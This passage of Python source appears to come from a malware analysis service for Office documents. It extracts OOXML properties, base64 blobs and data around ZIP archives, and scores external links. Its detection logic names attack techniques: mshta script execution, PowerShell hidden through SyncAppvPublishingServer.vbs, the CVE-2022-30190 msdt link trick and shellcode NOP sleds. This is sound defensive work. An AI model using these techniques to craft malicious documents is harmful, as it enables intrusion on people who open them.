                            self._extract_file(contents, ".xml", f"zipped file {f} contents")
                            xml_extracted.add(xml_sha256)
        except Exception:
            self.log.warning("Failed to analyze zipped file for sample %s:", self.sha, exc_info=True)

        if external_links:

            def get_verdict(heuristic: Heuristic) -> str:
                if heuristic.score >= 1000:
                    return "Malicious"
                if heuristic.score >= 500:
                    return "Suspicious"
                return "Informative"

            for verdict, processed_links in groupby(
                sorted(
                    ((external_link, *self._process_link(*external_link)) for external_link in external_links),
                    key=lambda x: x[1].score,
                    reverse=True,
                ),
                key=lambda x: get_verdict(x[1]),
            ):
                grouped_links, heuristics, tags_list = zip(*processed_links)

                result.add_section(
                    ResultSection(
                        verdict + " External Relationship Targets",
                        body="\n".join(f"{_type} link: {link}" for _type, link in grouped_links),
                        # Score only the most malicious link per category
                        heuristic=max(heuristics, key=lambda h: h.score),
                        tags=collate_tags(tags_list),
                    )
                )

        if xml_big_res.body:
            result.add_section(xml_big_res)
        if xml_ioc_res.tags:
            for tag_type, res_tags in xml_ioc_res.tags.items():
                for res_tag in res_tags:
                    xml_ioc_res.add_line(f"Found the {tag_type.rsplit('.', 1)[-1].upper()} string {res_tag} in:")
                    xml_ioc_res.add_lines(ioc_files[tag_type + safe_str(res_tag)])
                    xml_ioc_res.add_line("")
                    assert xml_ioc_res.heuristic
                    xml_ioc_res.heuristic.increment_frequency()
            result.add_section(xml_ioc_res)
        if xml_b64_res.subsections:
            result.add_section(xml_b64_res)

    def _process_ooxml_properties(self, z: zipfile.ZipFile) -> ResultSection | None:
        property_section = ResultKeyValueSection("OOXML Properties")
        property_paths = ["docProps/core.xml", "docProps/app.xml"]
        for prop_path in property_paths:
            if prop_path in z.NameToInfo:
                prop_file = z.open(prop_path).read()
                prop_xml = etree.XML(prop_file)
                for child in prop_xml:
                    label = child.tag.rsplit("}", 1)[-1]
                    if not label or not child.text:
                        continue
                    if len(child.text) > self.metadata_size_to_extract:
                        if not property_section.heuristic:
                            property_section.set_heuristic(17)
                        try:
                            data = bytes.fromhex(child.text)
                            property_section.heuristic.add_signature_id("hexadecimal")
                            if "90909090" in child.text:
                                property_section.heuristic.add_signature_id("shellcode")
                        except ValueError:
                            data = child.text.encode()
                        self._extract_file(data, f".{label}.data", f"OOXML {label} property")
                        property_section.set_item(
                            label, f"[Over {self.metadata_size_to_extract} bytes, see extracted files]"
                        )
                    else:
                        property_section.set_item(label, child.text)
                    if label in self.METADATA_TO_TAG and child.text:
                        property_section.add_tag(self.METADATA_TO_TAG[label], child.text)
        return property_section if property_section.body else None

    @staticmethod
    def _find_external_links(parsed: etree._Element) -> list[tuple[str, str]]:
        return [
            (relationship.attrib["Type"].rsplit("/", 1)[1], relationship.attrib["Target"])
            for relationship in parsed.findall(oleobj.OOXML_RELATIONSHIP_TAG, None)
            if "Target" in relationship.attrib
            and "Type" in relationship.attrib
            and "TargetMode" in relationship.attrib
            and relationship.attrib["TargetMode"] == "External"
        ]

    def _check_zip(self, file_path: str) -> ResultSection | None:
        malformed_section = ResultSection("Document's .ZIP archive is malformed")
        with open(file_path, "rb") as zipf:
            span = zip_span(zipf)
            if span is None:
                return None
            start, end = span
            if start > 0:
                heuristic = Heuristic(53)
                try:
                    zipf.seek(0)
                    start_data = zipf.read(start)
                except OSError:
                    self.log.exception("Error reading prepended zip content")
                else:
                    extracted_path = self._extract_file(
                        start_data, "_prepended_content", "Data prepended to the .ZIP archive"
                    )
                    if extracted_path:
                        malformed_section.add_line(
                            f"{start} bytes of data before the start of the .ZIP archive, "
                            f"see extracted file [{os.path.basename(extracted_path)}]."
                        )
                        if zipfile.is_zipfile(extracted_path):
                            heuristic.add_signature_id("zip_contatenation")
                    else:
                        malformed_section.add_line(f"{start} bytes of data before the start of the .ZIP archive.")
                    malformed_section.set_heuristic(heuristic)
            elif start < 0:
                malformed_section.add_line(
                    f".ZIP archive missing data: {-start} bytes missing from the start of the archive."
                )
            file_end = zipf.seek(0, 2)
            if end < file_end:
                try:
                    zipf.seek(end)
                    end_data = zipf.read()
                except OSError:
                    self.log.exception("Error reading appended zip content")
                else:
                    append_name = "_appended_content"
                    extracted_path = self._extract_file(end_data, append_name, "Data appended after the .ZIP archive")
                    if extracted_path:
                        malformed_section.add_line(
                            f"{file_end - end} bytes of data appended after the .ZIP archive, "
                            f"see extracted file [{os.path.basename(extracted_path)}]."
                        )
                    else:
                        malformed_section.add_line(f"{file_end - end} bytes of data appended after the .ZIP archive.")
            elif end > file_end:
                malformed_section.add_line(
                    f".ZIP archive is truncated: {end - file_end} bytes missing from the end of the archive."
                )
        return malformed_section if malformed_section.body else None

    # -- Helper methods --

    def _extract_file(self, data: bytes, file_name: str, description: str) -> str | None:
        """Add data as an extracted file.

        Checks that there the service hasn't hit the extraction limit before extracting.

        Args:
            data: The data to extract.
            file_name: File name suffix (all file names start with a part of the hash of the data).
            description: A description of the data.
        """
        try:
            # If for some reason the directory doesn't exist, create it
            if not os.path.exists(self.working_directory):
                os.makedirs(self.working_directory)
            file_name = hashlib.sha256(data).hexdigest()[:8] + file_name
            file_path = os.path.join(self.working_directory, file_name)
            with open(file_path, "wb") as f:
                f.write(data)
            if self.identify.fileinfo(file_path, generate_hashes=False)["type"] == "unknown":
                self.log.debug("Skipping extracting %s because it's type is unknown", file_name)
            else:
                self._extracted_files[file_name] = description
                return file_path
        except Exception:
            self.log.exception("Error extracting %s for sample %s:", file_name, self.sha)
        return None

    def _check_for_patterns(self, data: bytes, include_fpos: bool = False) -> tuple[Mapping[str, set[bytes]], bool]:
        """Use FrankenStrings module to find strings of interest.

        Args:
            data: The data to be searched.
            include_fpos: Whether to include possible false positives.

        Returns:
            Dictionary of strings found by type and whether entity should be extracted (boolean).
        """
        extract = False
        found_tags = defaultdict(set)

        # Plain IOCs
        patterns_found = self.patterns.ioc_match(data, bogon_ip=True)
        for tag_type, iocs in patterns_found.items():
            for ioc in iocs:
                if ioc.endswith(self.PAT_ENDS) or self.is_safelisted(tag_type, safe_str(ioc)):
                    continue
                # Skip .bin files that are common in normal excel files
                if not include_fpos and tag_type == "file.name.extracted" and re.match(self.EXCEL_BIN_RE, ioc):
                    continue
                extract = extract or self._decide_extract(tag_type, ioc, include_fpos)
                found_tags[tag_type].add(ioc)

        return dict(found_tags), extract

    def _decide_extract(self, ty: str, val: bytes, basic_only: bool = False) -> bool:
        """Determine if entity should be extracted by filtering for highly suspicious strings.

        Args:
            ty: IOC type.
            val: IOC value (as bytes).
            basic_only: If set to true only basic checks are done

        Returns:
            Whether the string is suspicious enough to trigger extraction.
        """
        if ty == "file.name.extracted":
            if val.startswith(b"oleObject"):
                return False
            _, ext = os.path.splitext(val)
            if ext and ext.upper() not in self.FILES_OF_INTEREST:
                return False

        return not (
            (ty == "file.string.blacklisted" and val == b"http")
            # When deepscanning, do only minimal whitelisting
            or not basic_only
            and (
                # common false positives
                (ty == "network.email.address")
                or (ty == "file.string.api" and val.lower() == b"connect")
                or (ty == "file.string.blacklisted" and val.lower() in self.BLACKLIST_IGNORE)
            )
        )

    def _check_for_b64(self, data: bytes, dataname: str) -> ResultSection | None:
        """Search and decode base64 strings in sample data.

        Args:
            data: The data to be searched.
            dataname: The name (file / section) the data is from

        Returns:
            ResultSection with base64 results if results were found.
        """
        b64_res = ResultSection(f"Base64 in {dataname}:")
        b64_ascii_content = []

        seen_base64 = set()
        for base64data, start, end in find_base64(data):
            if base64data in seen_base64 or not self.MAX_BASE64_CHARS > len(base64data) > 30:
                continue
            seen_base64.add(base64data)

            sha256hash = hashlib.sha256(base64data).hexdigest()
            dump_section: ResultSection | None = None
            if len(base64data) > self.MAX_STRINGDUMP_CHARS:
                # Check for embedded files of interest
                m = magic.Magic(mime=True)
                ftype = m.from_buffer(base64data)
                if "octet-stream" not in ftype:
                    continue
                self._extract_file(base64data, "_b64_decoded", "Extracted b64 file during OLETools analysis")
            else:
                # Display ascii content
                check_utf16 = base64data.decode("utf-16", "ignore").encode("ascii", "ignore")
                if check_utf16 != b"":
                    asc_b64 = check_utf16
                # Filter printable characters then put in results
                asc_b64 = bytes(i for i in base64data if 31 < i < 127)
                # If data has less then 7 uniq chars then ignore
                if len(set(asc_b64)) <= 6 or len(re.sub(rb"\s", b"", asc_b64)) <= 14:
                    continue
                dump_section = ResultSection(
                    "DECODED ASCII DUMP:", body=safe_str(asc_b64), body_format=BODY_FORMAT.MEMORY_DUMP
                )
                b64_ascii_content.append(asc_b64)

            sub_b64_res = ResultSection(f"Result {sha256hash}", parent=b64_res)
            sub_b64_res.add_line(f"BASE64 TEXT SIZE: {end-start}")
            sub_b64_res.add_line(f"BASE64 SAMPLE TEXT: {data[start:min(start+50, end)].decode()}[........]")
            sub_b64_res.add_line(f"DECODED SHA256: {sha256hash}")
            if dump_section:
                sub_b64_res.add_subsection(dump_section)
            else:
                sub_b64_res.add_line(
                    f"DECODED_FILE_DUMP: Possible base64 file contents were extracted. "
                    f"See extracted file {sha256hash[0:10]}_b64_decoded"
                )
            st_value = self.patterns.ioc_match(base64data, bogon_ip=True)
            for ty, val in st_value.items():
                for v in val:
                    sub_b64_res.add_tag(ty, v)

        if b64_ascii_content:
            all_b64 = b"\n".join(b64_ascii_content)
            self._extract_file(all_b64, "_b64.txt", f"b64 for {dataname}")

        return b64_res if b64_res.subsections else None

    def parse_uri(
        self, check_uri: bytes | str
    ) -> tuple[str, Literal["", "network.static.ip", "network.static.domain"], str]:
        """Use regex to determine if URI valid and should be reported.

        Args:
            check_uri: Possible URI string.

        Returns:
            A tuple of:
            - The parsed uri,
            - the hostname tag type,
            - the hostname (either domain or ip address)

        If any of the return values aren't parsed they are left empty.
        """
        # Url must be at start and can't contain whitespace
        split = check_uri.split(maxsplit=1)
        if not split:
            return "", "", ""
        try:
            # Url can't contain non-ascii characters
            truncated = split[0]
            decoded = truncated.decode("ascii") if isinstance(truncated, bytes) else truncated
        except UnicodeDecodeError:
            return "", "", ""
        try:
            url = urlsplit(decoded)
        except ValueError as e:
            # Implies we're given an invalid link to parse
            if str(e) == "Invalid IPv6 URL":
                return "", "", ""
            raise
        if not url.scheme or not url.hostname or not re.match("(?i)[a-z0-9.-]+", url.hostname):
            return "", "", ""

        url_text = url.scheme + "://" + url.netloc + url.path.split(":", 1)[0] if ":" in url.path else url.geturl()
        if is_valid_domain(url.hostname):
            return url_text, "network.static.domain", url.hostname
        try:
            parsed_ip = IPv4Address(socket.inet_aton(url.hostname)).compressed
            if is_valid_ip(parsed_ip) and not is_ip_reserved(parsed_ip):
                return url_text, "network.static.ip", parsed_ip
        except (OSError, AddressValueError, UnicodeDecodeError):
            pass

        return url_text, "", ""

    def _process_link(self, link_type: str, link: str | bytes) -> tuple[Heuristic, Tags]:
        """Process an external link to add the appropriate signatures to heuristic.

        Args:
            link_type: The type of the link.
            link: The link text.
            heuristic: The heuristic to signature.
            section: The section for ioc tags

        Returns:
            The heuristic that was passed as an argument.
        """
        heuristic = Heuristic(1)
        safe_link: str = safe_str(link)
        link_type = link_type.lower()
        unescaped = unquote(safe_link).strip()
        if unescaped.startswith("mshta"):
            heuristic.add_attack_id("T1218.005")
            heuristic.add_signature_id("mshta")
            _, command = unescaped.split(maxsplit=1)
            if command.startswith('"'):
                command = command[1:-1] if command.endswith('"') else command[1:]
            if command.startswith(("javascript:", "vbscript:")):
                script_type, script = command.split(":", 1)
                self._extract_file(
                    script.encode(),
                    f".mshta_{script_type}",
                    f"{script_type} executed by mshta.exe in external relationship",
                )
            else:
                safe_link = command
        if "SyncAppvPublishingServer.vbs" in unescaped:
            heuristic.add_attack_id("T1216")
            heuristic.add_signature_id("embedded_powershell")
            heuristic.add_signature_id(link_type)
            powershell = unescaped.split("SyncAppvPublishingServer.vbs", 1)[-1].encode()
            self._extract_file(powershell, ".ps1", "powershell hidden in hyperlink external relationship")
            return heuristic, {}
        if safe_link.startswith("mhtml:"):
            safe_link = safe_link[6:]
            heuristic.add_signature_id("mhtml_link")
            # Get last url link
            safe_link = safe_link.rsplit("!x-usc:")[-1]
            # Strip the mhtml path
            safe_link = safe_link.rsplit("!", 1)[0]
        if safe_link.startswith(R"file:///\\"):
            # UNC file path
            heuristic.add_signature_id("unc_path")
            # Convert to normal file uri
            safe_link = PureWindowsPath(unquote(safe_link[8:].split()[0])).as_uri()
        url, hostname_type, hostname = self.parse_uri(safe_link)
        if not hostname:
            # Not a valid link
            return heuristic, {}
        tags = {"network.static.uri": [url], hostname_type: [hostname]}
        safelisted = self.is_safelisted("network.static.uri", url) or self.is_safelisted(hostname_type, hostname)
        heuristic.add_signature_id(link_type)
        if safelisted or link_type == "oleobject" and ".sharepoint." in hostname:
            # Don't score oleobject links to sharepoint servers
            # or links with a safelisted url, domain, or ip.
            heuristic.score_map.update({link_type: 0, "unc_path": 0, "external_link_ip": 0})
        if url.endswith("!") and link_type == "oleobject":
            tags["network.static.uri"].append(url[:-1])
            tags["attribution.exploit"] = ["CVE-2022-30190"]
            heuristic.add_signature_id("msdt_exploit")
        if "../" in url:
            heuristic.add_signature_id("relative_path")
        if link_type == "attachedtemplate":
            heuristic.add_attack_id("T1221")
        if hostname_type == "network.static.ip" and link_type != "hyperlink":
            heuristic.add_signature_id("external_link_ip")
        filename = os.path.basename(urlsplit(url).path)
        path_extension = os.path.splitext(filename)[1].encode().lower()
        if (
            path_extension != b".com"
            and path_extension in self.EXECUTABLE_EXTENSIONS
            and not self.is_safelisted("file.name.extracted", filename)
        ):
            heuristic.add_signature_id("link_to_executable")
            tags["file.name.extracted"] = [filename]
        return heuristic, tags
